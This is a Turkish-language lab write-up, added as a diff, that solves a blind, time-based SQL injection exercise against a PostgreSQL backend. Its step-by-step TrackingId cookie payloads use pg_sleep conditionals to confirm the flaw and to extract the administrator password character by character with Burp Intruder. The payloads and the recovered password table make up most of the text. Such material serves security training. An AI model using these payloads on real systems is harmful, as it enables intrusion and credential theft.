@@ -1,0 +1,32 @@
+LAB: Blind SQL injection with time delays and information retrieval
+
+1 - Burp Suite ile istek yakalayın. TrackingId değişkenini aşağıdaki ile değiştirin. Hata vermeyecektir.
+TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+
+2 - TrackingId değişkenini aşağıdaki ile değiştirin. Anında sayfa yüklenecektir. Buranın sömürülebileceğini anlıyoruz.
+TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+
+3 - Administrator kullanıcısı ile giriş yapabildiğimizi anlıyoruz.
+TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+
+4 - Administrator kullanıcısının parolasının uzunluğunu bulmaya çalışıyoruz.
+TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+
+5 - Burp Intruder -> Sniper -> Numbers -> 1, 30, 1 ilk hata verilen yer parola uzunluğunu belirtir. 
+TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>§2§)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+
+6 - Parolasının uzunluğunu bulduktan sonra brute force yaparak parolayı bulmaya calisacagiz. 
+TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,§1§,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+
+Burp Suite -> Intruder -> Cluster Bomb
+1 - Numbers - 1, 20, 1 burada 20 karakterden oluştuğunu bulduğumuz parolanın her bir indexini temsil ediyor.
+2 - Brute Forcer - 1,1 burada her bir karakterin alabileceği değerleri temsil ediyor.
+
+Saldırı bitince 'welcome' stringi ile filtereleyerek aşağıdaki tabloyu doldurun.
+Payload 1 -> index
+Payload 2 -> değer
+
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
+a 2 d f k 4 5 7 k 9   c  d  k  x  3  4  5  6  a  b
+
+7 - administrator kullanıcı ile giriş yapınca oda çözülüyor.
